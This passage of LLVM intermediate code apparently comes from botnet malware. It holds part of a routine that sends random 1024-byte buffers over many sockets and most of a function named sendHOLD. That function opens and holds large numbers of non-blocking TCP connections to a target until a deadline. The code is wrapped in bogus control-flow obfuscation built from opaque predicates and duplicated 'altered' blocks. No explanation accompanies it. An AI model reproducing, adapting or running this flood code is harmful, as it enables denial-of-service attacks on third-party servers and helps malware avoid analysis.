  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %139
  %148 = load i32, i32* @x.69
  %149 = load i32, i32* @y.70
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %363

; <label>:156:                                    ; preds = %57
  br label %157

; <label>:157:                                    ; preds = %156
  %158 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %159 = getelementptr inbounds [16 x i64], [16 x i64]* %158, i64 0, i64 0
  %160 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %159) #2, !srcloc !6
  %161 = extractvalue { i64, i64* } %160, 0
  %162 = extractvalue { i64, i64* } %160, 1
  %163 = trunc i64 %161 to i32
  store i32 %163, i32* %18, align 4
  %164 = ptrtoint i64* %162 to i64
  %165 = trunc i64 %164 to i32
  store i32 %165, i32* %19, align 4
  br label %166

; <label>:166:                                    ; preds = %157
  %167 = load i32, i32* @x.69
  %168 = load i32, i32* @y.70
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %166
  %175 = load i32, i32* @x.69
  %176 = load i32, i32* @y.70
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %183

; <label>:183:                                    ; preds = %originalBBpart212
  %184 = load i32, i32* %8, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %185
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = srem i32 %188, 64
  %190 = zext i32 %189 to i64
  %191 = shl i64 1, %190
  %192 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = sdiv i32 %197, 64
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [16 x i64], [16 x i64]* %192, i64 0, i64 %199
  %201 = load i64, i64* %200, align 8
  %202 = or i64 %201, %191
  store i64 %202, i64* %200, align 8
  %203 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %203, align 8
  %204 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %204, align 8
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 8
  %210 = add nsw i32 %209, 1
  %211 = call i32 @select(i32 %210, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %211, i32* %15, align 4
  %212 = load i32, i32* %15, align 4
  %213 = icmp eq i32 %212, 1
  br i1 %213, label %214, label %273

; <label>:214:                                    ; preds = %183
  %215 = load i32, i32* @x.69
  %216 = load i32, i32* @y.70
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %214
  store i32 4, i32* %13, align 4
  %223 = load i32, i32* %8, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %224
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 8
  %228 = bitcast i32* %14 to i8*
  %229 = call i32 @getsockopt(i32 %227, i32 1, i32 4, i8* %228, i32* %13) #2
  %230 = load i32, i32* %14, align 4
  %231 = icmp ne i32 %230, 0
  %232 = load i32, i32* @x.69
  %233 = load i32, i32* @y.70
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %231, label %240, label %251

; <label>:240:                                    ; preds = %originalBBpart216
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %242
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = call i32 @close(i32 %245)
  %247 = load i32, i32* %8, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %248
  %250 = getelementptr inbounds %struct.state_t, %struct.state_t* %249, i32 0, i32 1
  store i8 0, i8* %250, align 4
  br label %256

; <label>:251:                                    ; preds = %originalBBpart216
  %252 = load i32, i32* %8, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %253
  %255 = getelementptr inbounds %struct.state_t, %struct.state_t* %254, i32 0, i32 1
  store i8 2, i8* %255, align 4
  br label %256

; <label>:256:                                    ; preds = %251, %240
  %257 = load i32, i32* @x.69
  %258 = load i32, i32* @y.70
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %256
  %265 = load i32, i32* @x.69
  %266 = load i32, i32* @y.70
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %320

; <label>:273:                                    ; preds = %183
  %274 = load i32, i32* @x.69
  %275 = load i32, i32* @y.70
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %273
  %282 = load i32, i32* %15, align 4
  %283 = icmp eq i32 %282, -1
  %284 = load i32, i32* @x.69
  %285 = load i32, i32* @y.70
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %283, label %292, label %319

; <label>:292:                                    ; preds = %originalBBpart224
  %293 = load i32, i32* @x.69
  %294 = load i32, i32* @y.70
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %292
  %301 = load i32, i32* %8, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %302
  %304 = getelementptr inbounds %struct.state_t, %struct.state_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 8
  %306 = call i32 @close(i32 %305)
  %307 = load i32, i32* %8, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %308
  %310 = getelementptr inbounds %struct.state_t, %struct.state_t* %309, i32 0, i32 1
  store i8 0, i8* %310, align 4
  %311 = load i32, i32* @x.69
  %312 = load i32, i32* @y.70
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %319

; <label>:319:                                    ; preds = %originalBBpart228, %originalBBpart224
  br label %320

; <label>:320:                                    ; preds = %319, %originalBBpart220
  br label %363

; <label>:321:                                    ; preds = %57
  %322 = load i32, i32* @x.69
  %323 = load i32, i32* @y.70
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %321
  %330 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %330, i32 1024)
  %331 = load i32, i32* %8, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %332
  %334 = getelementptr inbounds %struct.state_t, %struct.state_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 8
  %336 = load i8*, i8** %16, align 8
  %337 = call i64 @send(i32 %335, i8* %336, i64 1024, i32 16384)
  %338 = icmp eq i64 %337, -1
  %339 = load i32, i32* @x.69
  %340 = load i32, i32* @y.70
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %338, label %347, label %362

; <label>:347:                                    ; preds = %originalBBpart232
  %348 = call i32* @__errno_location() #13
  %349 = load i32, i32* %348, align 4
  %350 = icmp ne i32 %349, 11
  br i1 %350, label %351, label %362

; <label>:351:                                    ; preds = %347
  %352 = load i32, i32* %8, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %353
  %355 = getelementptr inbounds %struct.state_t, %struct.state_t* %354, i32 0, i32 0
  %356 = load i32, i32* %355, align 8
  %357 = call i32 @close(i32 %356)
  %358 = load i32, i32* %8, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %359
  %361 = getelementptr inbounds %struct.state_t, %struct.state_t* %360, i32 0, i32 1
  store i8 0, i8* %361, align 4
  br label %362

; <label>:362:                                    ; preds = %351, %347, %originalBBpart232
  br label %363

; <label>:363:                                    ; preds = %362, %320, %originalBBpart28, %57
  %364 = load i32, i32* @x.69
  %365 = load i32, i32* @y.70
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %363
  %372 = load i32, i32* @x.69
  %373 = load i32, i32* @y.70
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %380

; <label>:380:                                    ; preds = %originalBBpart236
  %381 = load i32, i32* %8, align 4
  %382 = add nsw i32 %381, 1
  store i32 %382, i32* %8, align 4
  br label %53

; <label>:383:                                    ; preds = %53
  br label %48

; <label>:384:                                    ; preds = %48
  %385 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %385)
  br label %386

; <label>:386:                                    ; preds = %384, %31
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %64
  %387 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %388 = load i32, i32* %8, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %389
  %391 = getelementptr inbounds %struct.state_t, %struct.state_t* %390, i32 0, i32 0
  store i32 %387, i32* %391, align 8
  %392 = load i32, i32* %8, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %393
  %395 = getelementptr inbounds %struct.state_t, %struct.state_t* %394, i32 0, i32 0
  %396 = load i32, i32* %395, align 8
  %397 = load i32, i32* %8, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %398
  %400 = getelementptr inbounds %struct.state_t, %struct.state_t* %399, i32 0, i32 0
  %401 = load i32, i32* %400, align 8
  %402 = call i32 (i32, i32, ...) @fcntl(i32 %401, i32 3, i8* null)
  %403 = or i32 %402, 2048
  %404 = call i32 (i32, i32, ...) @fcntl(i32 %396, i32 4, i32 %403)
  %405 = load i32, i32* %8, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %406
  %408 = getelementptr inbounds %struct.state_t, %struct.state_t* %407, i32 0, i32 0
  %409 = load i32, i32* %408, align 8
  %410 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %411 = call i32 @connect(i32 %409, %struct.sockaddr* %410, i32 16)
  %412 = icmp ne i32 %411, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %111
  %413 = load i32, i32* %8, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %414
  %416 = getelementptr inbounds %struct.state_t, %struct.state_t* %415, i32 0, i32 0
  %417 = load i32, i32* %416, align 8
  %418 = call i32 @close(i32 %417)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %139
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %166
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %214
  store i32 4, i32* %13, align 4
  %419 = load i32, i32* %8, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %420
  %422 = getelementptr inbounds %struct.state_t, %struct.state_t* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 8
  %424 = bitcast i32* %14 to i8*
  %425 = call i32 @getsockopt(i32 %423, i32 1, i32 4, i8* %424, i32* %13) #2
  %426 = load i32, i32* %14, align 4
  %427 = icmp ne i32 %426, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %256
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %273
  %428 = load i32, i32* %15, align 4
  %429 = icmp eq i32 %428, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %292
  %430 = load i32, i32* %8, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %431
  %433 = getelementptr inbounds %struct.state_t, %struct.state_t* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 8
  %435 = call i32 @close(i32 %434)
  %436 = load i32, i32* %8, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %437
  %439 = getelementptr inbounds %struct.state_t, %struct.state_t* %438, i32 0, i32 1
  store i8 0, i8* %439, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %321
  %440 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %440, i32 1024)
  %441 = load i32, i32* %8, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %442
  %444 = getelementptr inbounds %struct.state_t, %struct.state_t* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 8
  %446 = load i8*, i8** %16, align 8
  %447 = call i64 @send(i32 %445, i8* %446, i64 1024, i32 16384)
  %448 = icmp eq i64 %447, -1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %363
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %400

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %47, %48
  store i32 %49, i32* %17, align 4
  br label %50

; <label>:50:                                     ; preds = %397, %34
  %51 = load i32, i32* @x.71
  %52 = load i32, i32* @y.72
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* %17, align 4
  %60 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %61 = icmp sgt i32 %59, %60
  %62 = load i32, i32* @x.71
  %63 = load i32, i32* @y.72
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %61, label %70, label %398

; <label>:70:                                     ; preds = %originalBBpart2
  store i32 0, i32* %8, align 4
  br label %71

; <label>:71:                                     ; preds = %394, %70
  %72 = load i32, i32* %8, align 4
  %73 = load i32, i32* %7, align 4
  %74 = icmp slt i32 %72, %73
  br i1 %74, label %75, label %397

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* @x.71
  %77 = load i32, i32* @y.72
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 1
  %88 = load i8, i8* %87, align 4
  %89 = zext i8 %88 to i32
  %90 = load i32, i32* @x.71
  %91 = load i32, i32* @y.72
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  switch i32 %89, label %377 [
    i32 0, label %98
    i32 1, label %158
    i32 2, label %291
  ]

; <label>:98:                                     ; preds = %originalBBpart24
  %99 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %100 = load i32, i32* %8, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %101
  %103 = getelementptr inbounds %struct.state_t, %struct.state_t* %102, i32 0, i32 0
  store i32 %99, i32* %103, align 8
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = load i32, i32* %8, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %110
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %111, i32 0, i32 0
  %113 = load i32, i32* %112, align 8
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null)
  %115 = or i32 %114, 2048
  %116 = call i32 (i32, i32, ...) @fcntl(i32 %108, i32 4, i32 %115)
  %117 = load i32, i32* %8, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %118
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 8
  %122 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %123 = call i32 @connect(i32 %121, %struct.sockaddr* %122, i32 16)
  %124 = icmp ne i32 %123, -1
  br i1 %124, label %129, label %125

; <label>:125:                                    ; preds = %98
  %126 = call i32* @__errno_location() #13
  %127 = load i32, i32* %126, align 4
  %128 = icmp ne i32 %127, 115
  br i1 %128, label %129, label %136

; <label>:129:                                    ; preds = %125, %98
  %130 = load i32, i32* %8, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %131
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 8
  %135 = call i32 @close(i32 %134)
  br label %141

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* %8, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %138
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %139, i32 0, i32 1
  store i8 1, i8* %140, align 4
  br label %141

; <label>:141:                                    ; preds = %136, %129
  %142 = load i32, i32* @x.71
  %143 = load i32, i32* @y.72
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %141
  %150 = load i32, i32* @x.71
  %151 = load i32, i32* @y.72
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %377

; <label>:158:                                    ; preds = %originalBBpart24
  br label %159

; <label>:159:                                    ; preds = %158
  %160 = load i32, i32* @x.71
  %161 = load i32, i32* @y.72
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %159
  %168 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %169 = getelementptr inbounds [16 x i64], [16 x i64]* %168, i64 0, i64 0
  %170 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %169) #2, !srcloc !7
  %171 = extractvalue { i64, i64* } %170, 0
  %172 = extractvalue { i64, i64* } %170, 1
  %173 = trunc i64 %171 to i32
  store i32 %173, i32* %18, align 4
  %174 = ptrtoint i64* %172 to i64
  %175 = trunc i64 %174 to i32
  store i32 %175, i32* %19, align 4
  %176 = load i32, i32* @x.71
  %177 = load i32, i32* @y.72
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %184

; <label>:184:                                    ; preds = %originalBBpart212
  br label %185

; <label>:185:                                    ; preds = %184
  %186 = load i32, i32* %8, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %187
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 8
  %191 = srem i32 %190, 64
  %192 = zext i32 %191 to i64
  %193 = shl i64 1, %192
  %194 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = sdiv i32 %199, 64
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds [16 x i64], [16 x i64]* %194, i64 0, i64 %201
  %203 = load i64, i64* %202, align 8
  %204 = or i64 %203, %193
  store i64 %204, i64* %202, align 8
  %205 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %205, align 8
  %206 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %206, align 8
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = add nsw i32 %211, 1
  %213 = call i32 @select(i32 %212, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %213, i32* %15, align 4
  %214 = load i32, i32* %15, align 4
  %215 = icmp eq i32 %214, 1
  br i1 %215, label %216, label %259

; <label>:216:                                    ; preds = %185
  store i32 4, i32* %13, align 4
  %217 = load i32, i32* %8, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %218
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %219, i32 0, i32 0
